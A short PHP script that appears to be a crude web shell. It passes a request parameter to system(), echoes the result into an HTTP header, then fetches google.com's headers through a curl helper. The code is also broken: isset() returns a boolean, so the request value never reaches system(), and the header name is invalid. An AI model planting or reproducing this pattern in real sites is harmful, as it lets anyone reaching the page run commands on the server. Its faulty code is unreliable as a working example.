<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

require 'curl.php';
$curl = new Curl;

print_r($curl->get('google.com')->headers);

?>